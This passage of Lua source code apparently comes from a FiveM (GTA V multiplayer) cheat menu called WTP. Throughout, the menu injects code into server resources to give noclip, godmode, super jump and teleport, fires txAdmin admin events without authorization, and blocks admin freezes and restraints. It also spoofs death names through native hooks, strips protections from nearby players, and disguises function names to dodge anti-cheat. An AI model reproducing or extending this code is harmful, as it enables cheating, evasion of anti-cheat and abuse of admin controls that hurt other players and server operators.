                                                local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                                                local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                                                local validTarget = false

                                                if hit == 1 then
                                                    entityType = GetEntityType(entityHit)
                                                    if entityType == 3 or entityType == 2 or entityType == 1 then
                                                        validTarget = true
                                                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                                                    end
                                                end

                                                if IsDisabledControlJustReleased(0, 38) then
                                                    if validTarget and not holdingEntity then
                                                        holdingEntity = true
                                                        heldEntity = entityHit

                                                        local wfuawruawts = AttachEntityToEntity

                                                        if entityType == 3 then
                                                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                                        elseif entityType == 2 then
                                                            holdingCarEntity = true
                                                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                                        elseif entityType == 1 then
                                                            holdingPed = true
                                                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                                        end
                                                    end
                                                elseif IsDisabledControlJustReleased(0, 246) then
                                                    if holdingEntity then
                                                        local wgfawhtawrs = DetachEntity
                                                        local dfgjsdfuwer = ApplyForceToEntity
                                                        local sdgfhjwserw = ClearPedTasks

                                                        wgfawhtawrs(heldEntity, true, true)
                                                        dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                                        holdingEntity = false
                                                        holdingCarEntity = false
                                                        holdingPed = false
                                                        heldEntity = nil
                                                        sdgfhjwserw(PlayerPedId())
                                                    end
                                                end
                                            end
                                        end)

                                        function RotationToDirection(rotation)
                                            local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                                            local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                                            return direction
                                        end

                                        function DrawText3Ds(x, y, z, text)
                                            local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                                            local px, py, pz = table.unpack(GetGameplayCamCoords())
                                            local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                                            local fov = (1 / GetGameplayCamFov()) * 100
                                            scale = scale * fov

                                            if onScreen then
                                                SetTextScale(0.0 * scale, 0.35 * scale)
                                                SetTextFont(0)
                                                SetTextProportional(1)
                                                SetTextColour(235, 0, 121, 0.8)
                                                SetTextDropshadow(0, 0, 0, 0, 155)
                                                SetTextEdge(2, 0, 0, 0, 150)
                                                SetTextDropShadow()
                                                -- SetTextOutline()
                                                SetTextEntry("STRING")
                                                SetTextCentre(1)
                                                AddTextComponentString(text)
                                                DrawText(_x, _y)
                                            end
                                        end
                                    ]])
                                else
                                    MachoInjectResource("any", [[
                                        fgawjFmaDjdALaO = false
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Movement" },
                        {
                            type = "slider-checkbox",
                            label = "Noclip",
                            scrollType = "onScroll",
                            checked = false,
                            value = 1.0,
                            step = 1.0,
                            min = 1.0,
                            max = 12.0,
                            onSelect = function(sliderValue, checked)
                                if checked then
                                    executeCode('monitor', [[
                                        setNoclipAllow = true
                                        setNoclipActive = true
                                        setNoclipSpeed = ]] .. sliderValue .. [[

                                        local function getCamDirection()
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
                                            local pitch = GetGameplayCamRelativePitch()
                                            local x = -math.sin(math.rad(heading)) * math.cos(math.rad(pitch))
                                            local y = math.cos(math.rad(heading)) * math.cos(math.rad(pitch))
                                            local z = math.sin(math.rad(pitch))
                                            return vector3(x, y, z)
                                        end

                                        if not setNoclipThreads then
                                            setNoclipThreads = true

                                            WTP.SafeRunNative(CreateThread, function()
                                                while setNoclipAllow do
                                                    Wait(0)
                                                    if setNoclipActive and setNoclipAllow then
                                                        local setPed = PlayerPedId()
                                                        local pos = WTP.SafeRunNative(GetEntityCoords, setPed)
                                                        local move = vector3(0, 0, 0)
                                                        local camDir = getCamDirection()

                                                        if WTP.SafeRunNative(IsControlPressed, 0, 32) then move = move + (camDir * setNoclipSpeed) end
                                                        if WTP.SafeRunNative(IsControlPressed, 0, 33) then move = move - (camDir * setNoclipSpeed) end
                                                        if WTP.SafeRunNative(IsControlPressed, 0, 34) then move = move + (vector3(-camDir.y, camDir.x, 0) * setNoclipSpeed) end
                                                        if WTP.SafeRunNative(IsControlPressed, 0, 35) then move = move + (vector3(camDir.y, -camDir.x, 0) * setNoclipSpeed) end
                                                        if WTP.SafeRunNative(IsControlPressed, 0, 46) then move = move + vector3(0, 0, -setNoclipSpeed) end
                                                        if WTP.SafeRunNative(IsControlPressed, 0, 44) then move = move + vector3(0, 0, setNoclipSpeed) end
                                                        if WTP.SafeRunNative(IsControlPressed, 0, 21) then move = move * 2.5 end

                                                        if #(move) > 0.01 then
                                                            local newPos = pos + (move * 0.1)
                                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, setPed, newPos.x, newPos.y, newPos.z, true, true, true)
                                                        end

                                                        local camHeading = GetGameplayCamRelativeHeading() + GetEntityHeading(setPed)
                                                        WTP.SafeRunNative(SetEntityHeading, setPed, camHeading % 360)

                                                        WTP.SafeRunNative(FreezeEntityPosition, setPed, true)
                                                    else
                                                        local setPed = PlayerPedId()
                                                        WTP.SafeRunNative(FreezeEntityPosition, setPed, false)
                                                    end
                                                end
                                                setNoclipThreads = false
                                            end)
                                        end
                                    ]])
                                else
                                    executeCode('monitor', [[
                                        setNoclipAllow = false
                                        setNoclipActive = false
                                    ]])
                                end
                            end
                        },
                        { type = "slider-checkbox", label = "Freecam", scrollType = "onScroll", checked = false, value = 0.25, step = 0.25, min = 0.25, max = 5.0,
                            onSelect = function(sliderValue, checked)
                                self:ToggleFreecam(checked, sliderValue)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fast Run",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode('monitor', [[
                                        FastRun = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while FastRun do
                                                WTP.SafeRunNative(SetRunSprintMultiplierForPlayer, PlayerId(), 1.49)
                                                WTP.SafeRunNative(SetPedMoveRateOverride, PlayerPedId(), 3.0)
                                                Wait(1)
                                            end
                                            WTP.SafeRunNative(SetRunSprintMultiplierForPlayer, PlayerId(), 1.0)
                                            WTP.SafeRunNative(SetPedMoveRateOverride, PlayerPedId(), 1.0)
                                        end)
                                    ]])
                                else
                                    executeCode('monitor', [[
                                        FastRun = false
                                    ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Super Jump", checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode('monitor', [[
                                        SuperJumpToggle = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while SuperJumpToggle do
                                                WTP.SafeRunNative(SetSuperJumpThisFrame, PlayerId())
                                                Wait(0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('monitor', [[ SuperJumpToggle = false ]])
                                end
                            end
                        },
                    }
                },
                {
                    label = "Miscellaneous",
                    tabs = {
                        { icon = "", type = "button", label = "Suicide", desc = "This will kill you.",
                            onSelect = function()
                                local function RGybF0JqEt()
                                    local aSdFgHjKlQwErTy = SetEntityHealth
                                    aSdFgHjKlQwErTy(PlayerPedId(), 0)
                                end
                                RGybF0JqEt()
                            end
                        },
                        { icon = "", type = "button", label = "Force Ragdoll", desc = "This will ragdoll.",
                            onSelect = function()
                                MachoInjectResourceRaw("any", [[
                                    local function awfAEDSADWEf()
                                        local cWAmdjakwDksFD = SetPedToRagdoll
                                        cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                                    end

                                    awfAEDSADWEf()
                                ]])
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Primary", "Secondary" }, label = "Clear Tasks", desc = "Clears the character's tasks",
                            onSelect = function(value)
                                if value == "Primary" then
                                    ClearPedTasksImmediately(PlayerPedId())
                                else
                                    if value == "Secondary" then
                                        ClearPedSecondaryTask(PlayerPedId())
                                    end
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Spoofed Name",
                            desc = "This will change your deathcam name.",
                            onSelect = function()
                                KeyboardInput("Spoofed Name", "", function(val)
                                    if val and val ~= "" then
                                        HookNative(0x6D0DE6A7B5DA71F8, function() return false, val end)
                                    else
                                        WTP:Notify("Invalid input", "Please enter a valid Spoofed Name.", "error")
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            type = "button",
                            label = "Hold Peak",
                            onSelect = function()
                                KeyboardInput("Enter Key (e.g. E, LALT, LSHIFT)", "E", function(val)
                                    if val and val ~= "" then
                                        local key = val:upper()
                                        local keyTable = {
                                            ["E"] = 38, ["Q"] = 44, ["LSHIFT"] = 21, ["LALT"] = 19,
                                            ["SPACE"] = 22, ["TAB"] = 37, ["CAPS"] = 137, ["R"] = 45,
                                            ["F"] = 49, ["G"] = 47, ["X"] = 73, ["Z"] = 20,
                                            ["F1"] = 112, ["F2"] = 113, ["F3"] = 114, ["F4"] = 115, ["F5"] = 116, 
                                            ["F6"] = 117, ["F7"] = 118, ["F8"] = 119, ["F9"] = 120, ["F10"] = 121, 
                                            ["F11"] = 122, ["F12"] = 123,
                                            ["1"] = 49, ["2"] = 50, ["3"] = 51, ["4"] = 52, ["5"] = 53, 
                                            ["6"] = 54, ["7"] = 55, ["8"] = 56, ["9"] = 57, ["0"] = 48, 
                                            ["-"] = 189, ["="] = 187, ["`"] = 192,
                                            ["W"] = 87, ["T"] = 84, ["Y"] = 89, ["U"] = 85, ["I"] = 73, ["O"] = 79, ["P"] = 80,
                                            ["A"] = 65, ["S"] = 83, ["D"] = 68, ["H"] = 72, ["J"] = 74, ["K"] = 75, ["L"] = 76,
                                            ["C"] = 67, ["V"] = 86, ["B"] = 66, ["N"] = 78, ["M"] = 77,
                                            ["ESCAPE"] = 27, ["BACKSPACE"] = 8, ["ENTER"] = 13, ["CONTROL"] = 17, 
                                            ["DELETE"] = 46, ["PAGEUP"] = 33, ["PAGEDOWN"] = 34, ["HOME"] = 36, ["END"] = 35,
                                            ["INSERT"] = 121, ["CAPSLOCK"] = 20,
                                            ["UP"] = 38, ["DOWN"] = 40, ["LEFT"] = 37, ["RIGHT"] = 39,
                                            ["["] = 219, ["]"] = 221, ["\\"] = 220, [";"] = 186, ["'"] = 222,
                                            [","] = 188, ["."] = 190, ["/"] = 191
                                        }
                                        _G.CustomPeakKeyID = keyTable[key] or 38
                                        _G.RubberbandEnabled = true

                                        self:Notify("success", "WTP", "Hold Active! Hold: " .. key, 3000)

                                        if not _G.PeakThreadRunning then
                                            _G.PeakThreadRunning = true
                                            CreateThread(function()
                                                local startCoords = nil
                                                while _G.RubberbandEnabled do
                                                    local peakKeyID = _G.CustomPeakKeyID

                                                    if IsControlJustPressed(0, peakKeyID) then
                                                        startCoords = GetEntityCoords(PlayerPedId())
                                                    end

                                                    if IsControlJustReleased(0, peakKeyID) and startCoords then
                                                        SetEntityCoordsNoOffset(PlayerPedId(), startCoords.x, startCoords.y, startCoords.z, false, false, false)
                                                        startCoords = nil
                                                    end

                                                    Wait(0)
                                                end
                                                _G.PeakThreadRunning = false
                                            end)
                                        end
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "No Ragdoll",
                            checked = false,
                            desc = "This will prevent you from being ragdolled from admins or cheaters.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        if _G.NoRagdollThread then return end

                                        _G.NoRagdoll = true
                                        _G.NoRagdollThread = CreateThread(function()
                                            while _G.NoRagdoll do
                                                Wait(0)
                                                local ped = PlayerPedId()
                                                if DoesEntityExist(ped) and not IsEntityDead(ped) then
                                                    SetPedCanRagdoll(ped, false)
                                                    ClearPedTasks(ped)
                                                    SetEntityProofs(ped, false, true, false, false, false, false, true, false)
                                                end
                                            end
                                            _G.NoRagdollThread = nil
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[
                                        _G.NoRagdoll = false

                                        local ped = PlayerPedId()
                                        if DoesEntityExist(ped) and not IsEntityDead(ped) then
                                            SetPedCanRagdoll(ped, true)
                                            SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Freeze",
                            checked = false,
                            desc = "This will prevent you from being frozen.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.AntiFreeze = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.AntiFreeze do
                                                local ped = PlayerPedId()
                                                if WTP.SafeRunNative(IsEntityPositionFrozen, ped) then
                                                    WTP.SafeRunNative(FreezeEntityPosition, ped, false)
                                                    WTP.SafeRunNative(ClearPedTasksImmediately, ped)
                                                end
                                                WTP.SafeRunNative(SetPlayerControl, PlayerId(), true, 0)
                                                WTP.SafeRunNative(Wait, 1)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ _G.AntiFreeze = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-VDM",
                            checked = false,
                            desc = "Disables vehicle collision with you",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.AntiVDMEnabled = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.AntiVDMEnabled do
                                                local pCoords = GetEntityCoords(PlayerPedId())
                                                for _, vehicle in ipairs(GetGamePool("CVehicle")) do
                                                    if WTP.SafeRunNative(DoesEntityExist, vehicle) then
                                                        local vCoords = GetEntityCoords(vehicle)
                                                        local dist = #(pCoords - vCoords)
                                                        if dist <= 50.0 then
                                                            WTP.SafeRunNative(SetEntityNoCollisionEntity, vehicle, PlayerPedId(), true)
                                                        end
                                                    end
                                                end
                                                WTP.SafeRunNative(Wait, 0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[
                                        _G.AntiVDMEnabled = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Collision",
                            checked = false,
                            desc = "Disables collision",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.NoCollision = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            local ped = PlayerPedId()
                                            while _G.NoCollision do
                                                WTP.SafeRunNative(SetEntityCollision, ped, false, false)
                                                WTP.SafeRunNative(SetEntityInvincible, ped, true)

                                                local pos = GetEntityCoords(ped)
                                                local rayStart = vector3(pos.x, pos.y, pos.z + 1.0)
                                                local rayEnd = vector3(pos.x, pos.y, pos.z - 10.0)
                                                local rayHandle = StartShapeTestRay(rayStart.x, rayStart.y, rayStart.z, rayEnd.x, rayEnd.y, rayEnd.z, -1, ped, 7)
                                                local _, hit, hitPos, _, _ = GetShapeTestResult(rayHandle)

                                                if not hit then
                                                    WTP.SafeRunNative(SetEntityCoordsNoOffset, ped, pos.x, pos.y, pos.z + 1.0, false, false, false)
                                                elseif pos.z < hitPos.z + 0.5 then
                                                    WTP.SafeRunNative(SetEntityCoordsNoOffset, ped, pos.x, pos.y, hitPos.z + 0.5, false, false, false)
                                                end

                                                WTP.SafeRunNative(Wait, 10)
                                            end

                                            WTP.SafeRunNative(SetEntityCollision, ped, true, true)
                                            WTP.SafeRunNative(SetEntityInvincible, ped, false)
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ _G.NoCollision = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Drag",
                            checked = false,
                            desc = "Prevents being dragged",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        if AntiDrag == nil then AntiDrag = false end
                                        AntiDrag = true

                                        WTP.SafeRunNative(CreateThread, function()
                                            while AntiDrag do
                                                local ped = PlayerPedId()
                                                if WTP.SafeRunNative(IsEntityAttached, ped) then
                                                    WTP.SafeRunNative(DetachEntity, ped, true, false)
                                                end
                                                WTP.SafeRunNative(ClearPedSecondaryTask, ped)
                                                WTP.SafeRunNative(SetEnableHandcuffs, ped, false)
                                                if WTP.SafeRunNative(DoesEntityExist, Handcuffs) then WTP.SafeRunNative(DeleteEntity, Handcuffs) end
                                                if WTP.SafeRunNative(DoesEntityExist, handcuff) then WTP.SafeRunNative(DeleteEntity, handcuff) end
                                                WTP.SafeRunNative(FreezeEntityPosition, ped, false)
                                                WTP.SafeRunNative(Wait, 200)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ AntiDrag = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Attach",
                            checked = false,
                            desc = "Anti Attach ped/vehicles etc",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.AntiAttach = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.AntiAttach do
                                                WTP.SafeRunNative(Wait, 350)
                                                local ped = PlayerPedId()
                                                if DoesEntityExist(ped) then
                                                    if WTP.SafeRunNative(IsEntityAttachedToAnyObject, ped) or WTP.SafeRunNative(IsEntityAttachedToAnyVehicle, ped) or WTP.SafeRunNative(IsEntityAttachedToAnyPed, ped) or WTP.SafeRunNative(IsEntityAttachedToAnyEntity, ped) then
                                                        WTP.SafeRunNative(DetachEntity, ped, true, false)
                                                    end
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ _G.AntiAttach = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Passive Mode",
                            checked = false,
                            desc = "Cant shoot players/players cant shoot you",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.PassiveModeActive = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.PassiveModeActive do
                                                WTP.SafeRunNative(SetPedConfigFlag, PlayerPedId(), 423, true)
                                                Wait(1000)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ 
                                        _G.PassiveModeActive = false 
                                        WTP.SafeRunNative(SetPedConfigFlag, PlayerPedId(), 423, false)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Friendly Fire",
                            checked = false,
                            desc = "You will kill other player's using passive mode",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        local playerPed = PlayerPedId()
                                        WTP.SafeRunNative(NetworkSetFriendlyFireOption, true)
                                        WTP.SafeRunNative(SetCanAttackFriendly, playerPed, true, true)
                                        WTP.SafeRunNative(DisablePlayerFiring, playerPed, false)
                                        EnableAllControlActions(0)
                                        EnableAllControlActions(1)

                                        if not _G.WTPSHOP_FriendlyFireThread then
                                            _G.WTPSHOP_FriendlyFireThread = true
                                            CreateThread(function()
                                                local myId = PlayerId()
                                                while _G.WTPSHOP_FriendlyFireThread do
                                                    local myPed = PlayerPedId()
                                                    local myCoords = GetEntityCoords(myPed)
                                                    for _, player in ipairs(GetActivePlayers()) do
                                                        if player ~= myId then
                                                            local tPed = GetPlayerPed(player)
                                                            if DoesEntityExist(tPed) then
                                                                local tCoords = GetEntityCoords(tPed)
                                                                if #(myCoords - tCoords) < 200.0 then
                                                                    SetPedConfigFlag(tPed, 43, false)
                                                                    SetPedConfigFlag(tPed, 266, false)
                                                                    SetPedConfigFlag(tPed, 423, false)
                                                                    SetPedCanBeTargetted(tPed, true)
                                                                    SetPedCanBeTargettedByPlayer(tPed, myId, true)
                                                                    SetPedCanBeTargettedByTeam(tPed, 0, true)
                                                                    SetPedCanBeTargettedByTeam(tPed, 1, true)
                                                                    SetPedCanBeTargettedByTeam(tPed, 2, true)
                                                                    SetPedCanBeTargettedByTeam(tPed, 3, true)
                                                                    SetEntityInvincible(tPed, false)
                                                                    SetPedConfigFlag(tPed, 2, false)
                                                                    SetPedConfigFlag(tPed, 149, false)
                                                                    SetPedConfigFlag(tPed, 438, false)
                                                                    SetPedCanRagdollFromPlayerImpact(tPed, false)
                                                                    SetRagdollBlockingFlags(tPed, 1)
                                                                    SetRagdollBlockingFlags(tPed, 2)
                                                                    SetRagdollBlockingFlags(tPed, 4)
                                                                    SetPedConfigFlag(tPed, 89, false)
                                                                    SetPedConfigFlag(tPed, 106, false)
                                                                    SetPedConfigFlag(tPed, 107, false)
                                                                    SetPedConfigFlag(tPed, 108, false)
                                                                    SetPedConfigFlag(tPed, 109, false)
                                                                    SetPedConfigFlag(tPed, 110, false)
                                                                    SetPedConfigFlag(tPed, 164, false)
                                                                    SetPedConfigFlag(tPed, 184, false)
                                                                    SetPedConfigFlag(tPed, 306, false)
                                                                    SetPedConfigFlag(tPed, 308, false)
                                                                    SetPedCanRagdoll(tPed, true)
                                                                    SetPedSuffersCriticalHits(tPed, true)
                                                                end
                                                            end
                                                        end
                                                    end
                                                    Wait(100)
                                                end
                                            end)
                                        end
                                    ]])
                                else
                                    executeCode('any', [[
                                        _G.WTPSHOP_FriendlyFireThread = false
                                        local playerPed = PlayerPedId()
                                        WTP.SafeRunNative(NetworkSetFriendlyFireOption, false)
                                        WTP.SafeRunNative(SetCanAttackFriendly, playerPed, false, false)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Infinite Stamina",
                            checked = false,
                            desc = "This will enable Infinite Stamina.",
                            onSelect = function(checked)
                                if checked then
                                    WTP:Notify("success", "WTP", "Infinite Stamina On", 3000)
                                    executeCode('monitor', [[
                                        infiniteStamina = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while infiniteStamina do
                                                WTP.SafeRunNative(ResetPlayerStamina, PlayerId())
                                                Wait(30)
                                            end
                                        end)
                                    ]])
                                else
                                    WTP:Notify("error", "WTP", "Infinite Stamina Off", 3000)
                                    executeCode('monitor', [[ infiniteStamina = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Punch",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode('monitor', [[
                                        superPunch = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while superPunch do
                                                WTP.SafeRunNative(SetWeaponDamageModifier, GetHashKey('WEAPON_UNARMED'), 500.0)
                                                WTP.SafeRunNative(Wait, 0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('monitor', [[
                                        superPunch = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fast Punch",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode('monitor', [[
                                        _G.FastPunchEnabled = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.FastPunchEnabled do
                                                Wait(750)
                                                local ped = PlayerPedId()
                                                if IsPedOnFoot(ped) and not IsPedInAnyVehicle(ped, false) and GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_UNARMED") then
                                                    if IsControlPressed(0, 24) or IsControlPressed(0, 257) then
                                                        Wait(750)
                                                        ClearPedTasksImmediately(ped)
                                                    end
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('monitor', [[
                                        _G.FastPunchEnabled = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Auto Teleport To Waypoint",
                            checked = false,
                            onSelect = function(checked)
                                _G.AutoTeleport = checked

                                if checked then
                                    CreateThread(function()
                                        while _G.AutoTeleport do
                                            if IsWaypointActive() then
                                                executeCode('monitor', [[
                                                    WTP.SafeRunNative(TriggerEvent, 'txcl:tpToWaypoint')
                                                ]])
                                                self:Notify("info", "WTP", "Auto Teleporting...", 2000)
                                                while IsWaypointActive() and _G.AutoTeleport do
                                                    Wait(1000)
                                                end
                                            end

                                            Wait(500)
                                        end
                                    end)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Solo Session",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    MachoInjectResource2(AsThreadNs, 'any', [[
                                        if _G.WTPSoloSessionThread then return end
                                        _G.WTPSoloSessionThread = true
                                        NetworkStartSoloTutorialSession()
                                        _G.WTPSoloSessionThread = CreateThread(function()
                                            while _G.WTPSoloSessionThread do Wait(1000) end
                                            NetworkEndTutorialSession()
                                            _G.WTPSoloSessionThread = nil
                                        end)
                                    ]])
                                else
                                    MachoInjectResource2(AsThreadNs, 'any', [[
                                        _G.WTPSoloSessionThread = false
                                        CreateThread(function()
                                            while _G.WTPSoloSessionThread do Wait(50) end
                                            _G.WTPSoloSessionThread = nil
                                        end)
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "txAdmin Options" },
                        { type = "checkbox", label = "txAdmin Player IDs", checked = false, desc = "This will toggle txAdmin Player ids.",
                            onSelect = function(checked)
                                if checked then
                                    MachoInjectResource2(AsThreadNs, 'monitor', [[
                                        menuIsAccessible = true
                                        toggleShowPlayerIDs(true, true)
                                    ]])
                                else
                                    MachoInjectResource2(AsThreadNs, 'monitor', [[
                                        menuIsAccessible = true
                                        toggleShowPlayerIDs(false, true)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Noclip",
                            checked = false,
                            desc = "This will toggle txAdmin noclip.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('monitor', [[
                                        WTP.SafeRunNative(TriggerEvent, "txcl:setPlayerMode", "noclip", true)
                                    ]])
                                else
                                    executeCode('monitor', [[
                                        WTP.SafeRunNative(TriggerEvent, "txcl:setPlayerMode", "none", true)
                                    ]])
                                end
                            end,
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Godmode",
                            checked = false,
                            desc = "This will toggle txAdmin godmode.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('monitor', [[
                                        WTP.SafeRunNative(TriggerEvent, "txcl:setPlayerMode", "godmode", true)
                                    ]])
                                else
                                    executeCode('monitor', [[
                                        WTP.SafeRunNative(TriggerEvent, "txcl:setPlayerMode", "none", true)
                                    ]])
                                end
                            end,
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin SuperJump",
                            checked = false,
                            desc = "This will toggle txAdmin superjump.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('monitor', [[
                                        WTP.SafeRunNative(TriggerEvent, "txcl:setPlayerMode", "superjump", true)
                                    ]])
                                else
                                    executeCode('monitor', [[
                                        WTP.SafeRunNative(TriggerEvent, "txcl:setPlayerMode", "none", true)
                                    ]])
                                end
                            end,
                        },
                        { icon = "", type = "button", label = "txAdmin Heal",
                            onSelect = function()
                                executeCode('monitor', [[
                                    WTP.SafeRunNative(TriggerEvent, 'txcl:heal', -1)
                                ]])
                            end
                        },
                        { label = 'txAdmin Teleport To Waypoint', desc = "this will teleport you to waypoint", type = 'button',
                            onSelect = function()
                                executeCode('monitor', [[
                                    WTP.SafeRunNative(TriggerEvent, 'txcl:tpToWaypoint')
                                ]])
                            end
                        },
                        { label = 'txAdmin Fix Vehicle', desc = "this will fix your car", type = 'button',
                            onSelect = function()
                                executeCode('monitor', [[
                                    WTP.SafeRunNative(TriggerEvent, 'txcl:vehicle:fix')
                                ]])
                            end
                        },
                    }
                },
                {
                    label = "Wardrobe",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Random" }, label = "Outfit", desc = "Apply a preset outfit",
                            onSelect = function(value)
                                if value == "Random" then
                                    executeCode("any", [[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
